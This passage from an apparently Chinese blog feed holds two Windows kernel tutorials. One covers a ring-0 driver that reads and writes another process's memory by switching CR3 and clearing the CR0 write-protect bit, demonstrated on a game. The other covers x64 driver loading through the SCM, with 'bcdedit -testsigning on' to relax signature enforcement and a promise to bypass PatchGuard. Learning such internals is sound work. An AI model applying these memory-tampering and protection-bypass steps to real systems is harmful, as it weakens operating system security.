class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">0: kd&gt; dt _kthread -v -r2</div><div class="line">nt!_KTHREAD</div><div class="line">struct _KTHREAD, 73 elements, 0x1c0 bytes</div><div class="line">   +0x000 Header           : struct _DISPATCHER_HEADER, 6 elements, 0x10 bytes</div><div class="line">      +0x000 Type             : UChar</div><div class="line">      +0x001 Absolute         : UChar</div><div class="line">      +0x002 Size             : UChar</div><div class="line">      +0x003 Inserted         : UChar</div><div class="line">      +0x004 SignalState      : Int4B</div><div class="line">      +0x008 WaitListHead     : struct _LIST_ENTRY, 2 elements, 0x8 bytes</div><div class="line">         +0x000 Flink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes</div><div class="line">         +0x004 Blink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes</div><div class="line">   +0x010 MutantListHead   : struct _LIST_ENTRY, 2 elements, 0x8 bytes</div><div class="line">      +0x000 Flink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes</div><div class="line">         +0x000 Flink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes</div><div class="line">         +0x004 Blink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes</div><div class="line">      +0x004 Blink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes</div><div class="line">         +0x000 Flink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes</div><div class="line">         +0x004 Blink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes</div><div class="line">   +0x018 InitialStack     : Ptr32 to Void</div><div class="line">   +0x01c StackLimit       : Ptr32 to Void</div><div class="line">   +0x020 Teb              : Ptr32 to Void</div><div class="line">   +0x024 TlsArray         : Ptr32 to Void</div><div class="line">   +0x028 KernelStack      : Ptr32 to Void</div><div class="line">   +0x02c DebugActive      : UChar</div><div class="line">   +0x02d State            : UChar</div><div class="line">   +0x02e Alerted          : [2] UChar</div><div class="line">   +0x030 Iopl             : UChar</div><div class="line">   +0x031 NpxState         : UChar</div><div class="line">   +0x032 Saturation       : Char</div><div class="line">   +0x033 Priority         : Char</div><div class="line">   +0x034 ApcState         : struct _KAPC_STATE, 5 elements, 0x18 bytes</div><div class="line">      +0x000 ApcListHead      : [2] struct _LIST_ENTRY, 2 elements, 0x8 bytes</div><div class="line">         +0x000 Flink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes</div><div class="line">         +0x004 Blink            : Ptr32 to struct _LIST_ENTRY, 2 elements, 0x8 bytes</div><div class="line">      +0x010 Process          : Ptr32 to struct _KPROCESS, 29 elements, 0x6c bytes</div><div class="line">         +0x000 Header           : struct _DISPATCHER_HEADER, 6 elements, 0x10 bytes</div><div class="line">         +0x010 ProfileListHead  : struct _LIST_ENTRY, 2 elements, 0x8 bytes</div><div class="line">         +0x018 DirectoryTableBase : [2] Uint4B</div><div class="line">         +0x020 LdtDescriptor    : struct _KGDTENTRY, 3 elements, 0x8 bytes</div><div class="line">         +0x028 Int21Descriptor  : struct _KIDTENTRY, 4 elements, 0x8 bytes</div><div class="line">         +0x030 IopmOffset       : Uint2B</div><div class="line">         +0x032 Iopl             : UChar</div><div class="line">         ….. ….. .. . . .. .</div></pre></td></tr></table></figure></p>
<p>得到eprocess之后就可以得到很多信息了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">0: kd&gt; dt _eprocess</div><div class="line">nt!_EPROCESS</div><div class="line">   +0x000 Pcb              : _KPROCESS</div><div class="line">   +0x06c ProcessLock      : _EX_PUSH_LOCK</div><div class="line">   +0x070 CreateTime       : _LARGE_INTEGER</div><div class="line">   +0x078 ExitTime         : _LARGE_INTEGER</div><div class="line">   +0x080 RundownProtect   : _EX_RUNDOWN_REF</div><div class="line">   +0x084 UniqueProcessId  : Ptr32 Void</div><div class="line">   +0x088 ActiveProcessLinks : _LIST_ENTRY</div><div class="line">   +0x090 QuotaUsage       : [3] Uint4B</div><div class="line">   +0x09c QuotaPeak        : [3] Uint4B</div><div class="line">   +0x0a8 CommitCharge     : Uint4B</div><div class="line">   +0x0ac PeakVirtualSize  : Uint4B</div><div class="line">   +0x0b0 VirtualSize      : Uint4B</div><div class="line">   +0x0b4 SessionProcessLinks : _LIST_ENTRY</div><div class="line">   +0x0bc DebugPort        : Ptr32 Void</div><div class="line">   +0x0c0 ExceptionPort    : Ptr32 Void</div><div class="line">   +0x0c4 ObjectTable      : Ptr32 _HANDLE_TABLE</div><div class="line">   +0x0c8 Token            : _EX_FAST_REF</div><div class="line">   +0x0cc WorkingSetLock   : _FAST_MUTEX</div><div class="line">   +0x0ec WorkingSetPage   : Uint4B</div><div class="line">   +0x0f0 AddressCreationLock : _FAST_MUTEX</div><div class="line">   +0x110 HyperSpaceLock   : Uint4B</div><div class="line">   +0x114 ForkInProgress   : Ptr32 _ETHREAD</div><div class="line">   +0x118 HardwareTrigger  : Uint4B</div><div class="line">   +0x11c VadRoot          : Ptr32 Void</div><div class="line">   +0x120 VadHint          : Ptr32 Void</div><div class="line">   +0x124 CloneRoot        : Ptr32 Void</div><div class="line">   +0x128 NumberOfPrivatePages : Uint4B</div><div class="line">   +0x12c NumberOfLockedPages : Uint4B</div><div class="line">   +0x130 Win32Process     : Ptr32 Void</div><div class="line">   +0x134 Job              : Ptr32 _EJOB</div><div class="line">   +0x138 SectionObject    : Ptr32 Void</div><div class="line">   +0x13c SectionBaseAddress : Ptr32 Void</div><div class="line">   +0x140 QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK</div><div class="line">   +0x144 WorkingSetWatch  : Ptr32 _PAGEFAULT_HISTORY</div><div class="line">   +0x148 Win32WindowStation : Ptr32 Void</div><div class="line">   +0x14c InheritedFromUniqueProcessId : Ptr32 Void</div><div class="line">   +0x150 LdtInformation   : Ptr32 Void</div><div class="line">   +0x154 VadFreeHint      : Ptr32 Void</div><div class="line">   +0x158 VdmObjects       : Ptr32 Void</div><div class="line">   +0x15c DeviceMap        : Ptr32 Void</div><div class="line">   +0x160 PhysicalVadList  : _LIST_ENTRY</div><div class="line">   +0x168 PageDirectoryPte : _HARDWARE_PTE</div><div class="line">   +0x168 Filler           : Uint8B</div><div class="line">   +0x170 Session          : Ptr32 Void</div><div class="line">   +0x174 ImageFileName    : [16] UChar</div><div class="line">   +0x184 JobLinks         : _LIST_ENTRY</div><div class="line">   +0x18c LockedPagesList  : Ptr32 Void</div><div class="line">   +0x190 ThreadListHead   : _LIST_ENTRY</div><div class="line">   +0x198 SecurityPort     : Ptr32 Void</div></pre></td></tr></table></figure></p>
<p>#遍历进程<br>通过遍历链表便可以得到每一个进程的eprocess结构、<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">0: kd&gt; !dml_proc</div><div class="line">Address  PID  Image file name</div><div class="line">865b5830 4    System         </div><div class="line">8652f020 23c  smss.exe       </div><div class="line">861692a0 280  csrss.exe      </div><div class="line">86285570 2a0  winlogon.exe   </div><div class="line">864b2020 2cc  services.exe   </div><div class="line">861b7310 2d8  lsass.exe      </div><div class="line">8649db10 388  vmacthlp.exe   </div><div class="line">863a03c0 398  svchost.exe    </div><div class="line">8613ada0 3dc  svchost.exe    </div><div class="line">86411da0 43c  svchost.exe    </div><div class="line">863d5020 4a0  svchost.exe    </div><div class="line">861af258 504  svchost.exe    </div><div class="line">86084da0 564  spoolsv.exe    </div><div class="line">8627ca20 6a0  explorer.exe   </div><div class="line">861cf558 750  rundll32.exe   </div><div class="line">8617e6d8 758  vmtoolsd.exe   </div><div class="line">864ef358 760  ctfmon.exe     </div><div class="line">8605f440 7f4  svchost.exe    </div><div class="line">861c87e8 100  svchost.exe    </div><div class="line">86110da0 1b4  vmtoolsd.exe   </div><div class="line">863948b0 694  TPAutoConnSvc.e</div><div class="line">8638e940 6d8  alg.exe        </div><div class="line">8638a850 fc   wscntfy.exe    </div><div class="line">864ecda0 d1c  PlantsVsZombies</div><div class="line">861b6b90 d34  wuauclt.exe    </div><div class="line">85f19368 8a4  notepad.exe    </div><div class="line">8640c5f8 af4  logon.scr</div></pre></td></tr></table></figure></p>
<p>我们通过遍历eprocess<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">0: kd&gt; dt _eprocess 85f19368</div><div class="line">nt!_EPROCESS</div><div class="line">   +0x000 Pcb              : _KPROCESS</div><div class="line">   +0x06c ProcessLock      : _EX_PUSH_LOCK</div><div class="line">   +0x070 CreateTime       : _LARGE_INTEGER 0x01d0d404`4155cb66</div><div class="line">   +0x078 ExitTime         : _LARGE_INTEGER 0x0</div><div class="line">   +0x080 RundownProtect   : _EX_RUNDOWN_REF</div><div class="line">… … … …</div><div class="line">    +0x168 Filler           : 0</div><div class="line">   +0x170 Session          : 0xf7b11000 Void</div><div class="line">   +0x174 ImageFileName    : [16]  “notepad.exe” </div><div class="line"></div><div class="line"></div><div class="line">0: kd&gt; dt _eprocess (0x8640c680 - 0x88)</div><div class="line">nt!_EPROCESS</div><div class="line">   +0x000 Pcb              : _KPROCESS</div><div class="line">   +0x06c ProcessLock      : _EX_PUSH_LOCK</div><div class="line">   +0x070 CreateTime       : _LARGE_INTEGER 0x01d0d409`65015648</div><div class="line">   +0x078 ExitTime         : _LARGE_INTEGER 0x0</div><div class="line">   +0x080 RundownProtect   : _EX_RUNDOWN_REF</div><div class="line">   +0x084 UniqueProcessId  : 0x00000af4 Void</div><div class="line">   +0x088 ActiveProcessLinks : _LIST_ENTRY [ 0x805648b8 - 0x85f193f0 ]</div><div class="line">   +0x090 QuotaUsage       : [3] 0x988</div><div class="line">   +0x09c QuotaPeak        : [3] 0xa28</div><div class="line">   +0x0a8 CommitCharge     : 0x233</div><div class="line">   +0x0ac PeakVirtualSize  : 0x1706000</div><div class="line">… . .. . . .</div><div class="line">+0x168 PageDirectoryPte : _HARDWARE_PTE</div><div class="line">   +0x168 Filler           : 0</div><div class="line">   +0x170 Session          : 0xf7b11000 Void</div><div class="line">   +0x174 ImageFileName    : [16]  &quot;logon.scr&quot;</div><div class="line">   +0x184 JobLinks         : _LIST_ENTRY [ 0x862ceac8 - 0x862ceac8 ]</div></pre></td></tr></table></figure></p>
<p>#获得CR3<br>通过遍历可以得到每一个进程的EPROCESS结构，进而可以得到每个进程独立的CR3寄存器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">0: kd&gt; dt _eprocess</div><div class="line">nt!_EPROCESS</div><div class="line">   +0x000 Pcb              : _KPROCESS</div><div class="line">   +0x06c ProcessLock      : _EX_PUSH_LOCK</div><div class="line">   +0x070 CreateTime       : _LARGE_INTEGER</div><div class="line">… … … … </div><div class="line">0: kd&gt; dt _kprocess </div><div class="line">nt!_KPROCESS</div><div class="line">   +0x000 Header           : _DISPATCHER_HEADER</div><div class="line">   +0x010 ProfileListHead  : _LIST_ENTRY</div><div class="line">   +0x018 DirectoryTableBase : [2] Uint4B</div><div class="line">   +0x020 LdtDescriptor    : _KGDTENTRY</div><div class="line">… … … …</div></pre></td></tr></table></figure></p>
<p>DirectoryTableBase[0]存放的就是cr3寄存器内容，DirectoryTableBase[1]通常用于hyperspace。<br>通过上面遍历进程可以得到EPROCESS结构，然后eprocess+0x18便是我们要获取的DirectoryTableBase[0]。<br>得到DirectoryTableBase[0]之后，就可以将其写入cr3来切换进程环境。进而可以实现读取内存，和修改内存。<br>这里如果想要通过偏移读取内存，则会涉及到windows分页机制，关于windows分页机制参见另外一篇文章。</p>
<p>#读取内存<br>通过驱动加载遍历进程然后获得了每一个进程的EPROCESS结构指针，然后在读取内存时将读取地址，大小和对应的进程指针通过结构传入底层<br>结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">typedef struct _ReadMemInfo</div><div class="line">&#123;</div><div class="line">    DWORD dwReadAddr;</div><div class="line">    int dwReadLen;</div><div class="line">    DWORD dwEprocess;</div><div class="line">&#125;ReadMemInfo;</div></pre></td></tr></table></figure></p>
<p>通过选择进程列表中进程来获取eprocess结构<br>strEprocess = m_process.GetItemText(dwSelect, 3);<br>        //将十六进制字符串转换为十进制数<br>sscanf_s(strEprocess, “%x”, &amp;g_dwEprocess);<br>然后通过deviceIoControl传入底层<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">BOOL bRet =  DeviceIoControl(m_hDevice,</div><div class="line">            IOCTL_READ_MEMORY,</div><div class="line">            pReadMemInfo,</div><div class="line">            sizeof(ReadMemInfo),</div><div class="line">            pOutMemInfo,</div><div class="line">            pReadMemInfo-&gt;dwReadLen,</div><div class="line">            &amp;dwbyteReturn,</div><div class="line">            NULL);</div></pre></td></tr></table></figure></p>
<p>在驱动方面：<br>通过传入nEprocess获得cr3切换进程环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ULONG uNewCr3 = *(PULONG)(pReadMemInfo-&gt;nEprocess + 0x18);</div><div class="line">_asm</div><div class="line">&#123;</div><div class="line">    mov eax, cr3</div><div class="line">    mov uOldCr3, eax</div><div class="line">                     </div><div class="line">mov eax, uNewCr3</div><div class="line">    mov cr3, eax</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>然后进行内存拷贝<br><code>RtlCopyMemory(pIoBuffer,(PVOID)pReadMemInfo-&gt;nMemoryAddr, pReadMemInfo-&gt;nReadSize);</code><br>最后恢复进程环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">_asm</div><div class="line">    &#123;</div><div class="line">        mov eax, uOldCr3</div><div class="line">        mov cr3, eax</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>#修改内存<br>应用层上，通过选择进程列表进程获取遍历之后的eprocess指针，后通过将写入地址，内容，大小和进程指针通过结构体传入底层<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">typedef struct _WriteMemInfo</div><div class="line">&#123;</div><div class="line">    int dwWriteAddr;</div><div class="line">    int nWriteLen;</div><div class="line">    int nEprocess;</div><div class="line">    BYTE* pWriteData;</div><div class="line">&#125;WriteMemInfo;</div></pre></td></tr></table></figure></p>
<p>仍然通过deviceiocontrol 缓冲区读写方式交互<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">DWORD bRet = DeviceIoControl(m_hDevice,</div><div class="line">            IOCTL_WRITE_MEMORY,</div><div class="line">            pWriteMemInfo,</div><div class="line">            sizeof(WriteMemInfo),</div><div class="line">            NULL,</div><div class="line">            NULL,</div><div class="line">            &amp;dwReturnByte,</div><div class="line">            NULL);</div></pre></td></tr></table></figure></p>
<p>在驱动层：<br>切换进程环境，关中断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">_asm</div><div class="line">&#123;</div><div class="line">    mov eax, cr3</div><div class="line">    mov uOldCr3,  eax</div><div class="line">                    </div><div class="line">mov eax, uNewCr3</div><div class="line">mov cr3,  eax</div><div class="line">    //关中断</div><div class="line">    cli</div><div class="line">    push eax</div><div class="line">    mov eax, cr0</div><div class="line">    and eax, not 10000h</div><div class="line">    mov cr0, eax</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>写内存<br><code>RtlCopyMemory((PVOID)pWriteMemInfo-&gt;nMemoryAddr, pWriteData, pWriteMemInfo-&gt;nWriteLen);</code><br>开中断，恢复环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">_asm</div><div class="line">&#123;</div><div class="line">    //开中断</div><div class="line">    mov eax, cr0</div><div class="line">    or eax, 10000h</div><div class="line">    mov cr0, eax</div><div class="line">    pop eax</div><div class="line">    sti</div><div class="line"></div><div class="line">    //恢复现场</div><div class="line">    mov eax, uOldCr3</div><div class="line">    mov cr3, eax</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>#demo效果<br>加载驱动：<br><img src="http://ww4.sinaimg.cn/large/dcfd67b5gw1f0fm9zphghj20hr041mxl.jpg" alt=""><br>开启应用层程序<br><img src="http://ww4.sinaimg.cn/large/dcfd67b5gw1f0fmafe9h6j20so0ar0vz.jpg" alt=""><br>选择程序读取<br><img src="http://ww3.sinaimg.cn/large/dcfd67b5gw1f0fmc0j9d4j20le06cta1.jpg" alt=""><br>对比OD发现读取正确<br>选择上述地址写入<br><img src="http://ww2.sinaimg.cn/large/dcfd67b5gw1f0fmvt3sizj205y01nt8j.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/large/dcfd67b5gw1f0fmcdtkuuj204v02k748.jpg" alt=""><br>写入成功</p>
<p>#后<br>相关代码已上传github<br>工具尚不完善<br>读取功能会添加多级指针读取内存地址<br>写入功能会添加不同数据格式写入<br>部分代码有借鉴<br>其他功能继续完善<br>大牛勿喷<br>…</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前写过一篇关于X86下ring0读写内存的文章，功能虽然尚未完善，但是可以参考下如何通过应用层与驱动层通信进而直接改写内存数值。最近在写x64下的操作内存的驱动，于是就把之前写的代码翻出来一起发了出来&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://venidic.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="驱动" scheme="http://venidic.com/tags/%E9%A9%B1%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>win7 x64内核安全（2）-驱动加载</title>
    <link href="http://venidic.com/2016/01/23/x64%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89-%E9%A9%B1%E5%8A%A8%E5%8A%A0%E8%BD%BD/"/>
    <id>http://venidic.com/2016/01/23/x64内核安全（2）-驱动加载/</id>
    <published>2016-01-22T16:46:57.000Z</published>
    <updated>2016-01-28T03:08:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章接着上面一篇，主要讲述如何x64与x86编程的不同以及如何通过编程自加载所编写的驱动。</p>
<a id="more"></a>
<p>#x64与x86驱动编程</p>
<p>##系统变化<br>之前在x86体系下的xp，因为当时微软底层下限制很少，导致对驱动和内核的修改可以很轻松随意。于是2000年后xp系统上的病毒的泛滥程度可谓是 随处可见。后来微软对底层出了限制，在推出64位系统架构的时候，首先增加了WOW64（windows-on windows 64-bit）子系统机制，为了安全起见又推出了KPP（kernel patch protection）和DSE（driver signature enforcement）。</p>
<ul>
<li>wow64子系统：为兼容32位系统新增加的机制，通过“thunking”对32下的请求进行转换</li>
<li>KPP（内核补丁保护）：检测内核是否被修改，挂钩，如果检测到则触发蓝屏，具体实现机制是patchguard技术</li>
<li>DSE（驱动签名机制）：拒绝加载不包含正确签名的驱动（需要想微软官方购买正规的数字签名）</li>
</ul>
<p>关于如何绕过或者尽量避免这些限制，我们之后在讲，比如通过加载PatchGuard为保护的上层驱动，绕过KPP</p>
<p><strong>wow64</strong>：<br>wow64包括文件<strong>文件系统重定向器</strong>和<strong>注册表重定向器</strong>，具体靠<code>Wow64.dll, Wow64Win.dll, Wow64Cpu.dll</code>来实现。<br>wow64子系统的引进，给编程带来的就是System32和SysWOW64这两个文件夹的困扰。由于WOW64存在，则一切32位相关的文件会被定位到syswow64文件夹中，而这个时候如果我们想要访问，则需要暂时关闭这个机制，用到api如下：<br><code>Wow64DisableWow64FsRedirection</code><br>回复需要用<code>Wow64RevertWow64FsRedirection</code><br>具体参数可MSDN查阅</p>
<p><strong>关闭DSE：</strong><br>当然在我们测试的时候，使用命令<br><code>bcdedit -testsigning on</code> 打开测试签名模式，DSE不会严格执行<br><code>bcdedit -testsigning off</code> 关闭测试签名模式<br>或者在开机时F8，选择“禁用驱动程序强制签名”</p>
<p><strong>关闭KPP：</strong><br>而使用双机调试环境，则patchguard不会被启动</p>
<p>##编程差异<br><strong>内联汇编</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#if DBG</div><div class="line">        _asm int 3</div><div class="line">#endif</div><div class="line">        return STATUS_SUCCESS;</div></pre></td></tr></table></figure></p>
<p>上述在x64下编译会出错，取而代之为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#if DBG</div><div class="line">        DbgBreakPoint();</div><div class="line">#endif</div><div class="line">        return STATUS_SUCCESS;</div></pre></td></tr></table></figure></p>
<p>如果要单独使用汇编，则需要将函数放在asm文件中，在source中指定asm文件</p>
<p><strong>预处理</strong><br>_M_AMD64: 编译环境为AMD64<br>_M_IX64:  编译环境为IA64</p>
<p><strong>数据结构</strong><br>这个在只有我们遇到了再说</p>
<p>#驱动加载<br>一般在测试过程中会使用现成的工具加载，但是当以后我们自己开发驱动的时候，就需要自动实现了。一般需要用到SCM（service control manager）组件。<br>一般使用SCM加载驱动的流程分为：<br><img src="http://ww1.sinaimg.cn/large/dcfd67b5gw1f0e41ihvhej20dl0bkq3a.jpg" alt=""><br>（<strong>注意上述GetLastError判断服务是否存在的时候那个返回值应该是这本书作者的一个失误，这里应该是ERROR_SERVICE_EXISTS</strong>）<br>卸载对应的流程如图：<br><img src="http://ww2.sinaimg.cn/large/dcfd67b5gw1f0e4272y5rj208m0ajmx9.jpg" alt=""><br>其中用到的API：<br>打开SCM管理器函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">SC_HANDLE WINAPI OpenSCManager(</div><div class="line">  _In_opt_ LPCTSTR lpMachineName,    //计算机名称</div><div class="line">  _In_opt_ LPCTSTR lpDatabaseName,   //SCM数据库名称</div><div class="line">  _In_     DWORD   dwDesiredAccess   //使用权限</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>关闭服务句柄<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI CloseServiceHandle(</div><div class="line">  _In_ SC_HANDLE hSCObject    //要关闭的SCM句柄</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>创建服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">SC_HANDLE WINAPI CreateService(</div><div class="line">  _In_      SC_HANDLE hSCManager,</div><div class="line">  _In_      LPCTSTR   lpServiceName,</div><div class="line">  _In_opt_  LPCTSTR   lpDisplayName,</div><div class="line">  _In_      DWORD     dwDesiredAccess,</div><div class="line">  _In_      DWORD     dwServiceType,</div><div class="line">  _In_      DWORD     dwStartType,</div><div class="line">  _In_      DWORD     dwErrorControl,</div><div class="line">  _In_opt_  LPCTSTR   lpBinaryPathName,</div><div class="line">  _In_opt_  LPCTSTR   lpLoadOrderGroup,</div><div class="line">  _Out_opt_ LPDWORD   lpdwTagId,</div><div class="line">  _In_opt_  LPCTSTR   lpDependencies,</div><div class="line">  _In_opt_  LPCTSTR   lpServiceStartName,</div><div class="line">  _In_opt_  LPCTSTR   lpPassword</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>这个函数比较大，具体的可以参见MSDN官方文档</p>
<p>打开服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">SC_HANDLE WINAPI OpenService(</div><div class="line">  _In_ SC_HANDLE hSCManager,</div><div class="line">  _In_ LPCTSTR   lpServiceName,</div><div class="line">  _In_ DWORD     dwDesiredAccess</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>引用下官网说明：</p>
<blockquote>
<p>hSCManager [in]<br>A handle to the service control manager database. The OpenSCManager function returns this handle. For more information, see Service Security and Access Rights.<br>lpServiceName [in]<br>The name of the service to be opened. This is the name specified by the lpServiceName parameter of the CreateService function when the service object was created, not the service display name that is shown by user interface applications to identify the service.<br>The maximum string length is 256 characters. The service control manager database preserves the case of the characters, but service name comparisons are always case insensitive. Forward-slash (/) and backslash () are invalid service name characters.<br>dwDesiredAccess [in]<br>The access to the service. For a list of access rights, see Service Security and Access Rights.<br>Before granting the requested access, the system checks the access token of the calling process against the discretionary access-control list of the security descriptor associated with the service object.</p>
</blockquote>
<p>控制服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI ControlService(</div><div class="line">  _In_  SC_HANDLE        hService,</div><div class="line">  _In_  DWORD            dwControl,</div><div class="line">  _Out_ LPSERVICE_STATUS lpServiceStatus</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>具体解释参见MSDN<br><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682108(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/ms682108(v=vs.85).aspx</a></p>
